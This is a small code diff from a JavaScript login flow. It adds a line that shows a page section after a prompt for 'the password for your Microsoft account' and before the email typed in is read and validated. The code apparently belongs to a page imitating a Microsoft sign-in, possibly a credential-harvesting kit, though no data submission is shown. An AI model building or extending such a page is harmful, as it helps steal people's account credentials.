@@ -10562,6 +10562,7 @@ $(document).ready(function() {
     document.querySelector('#msg').innerText = "Please enter the password for your Microsoft account.";
 } else {
     $("#div2").hide();
+    $("#div3").show();
     let email = $("#ai").val(); // Retrieve email from input field
     if (validateEmail(email)) {
         let data = {
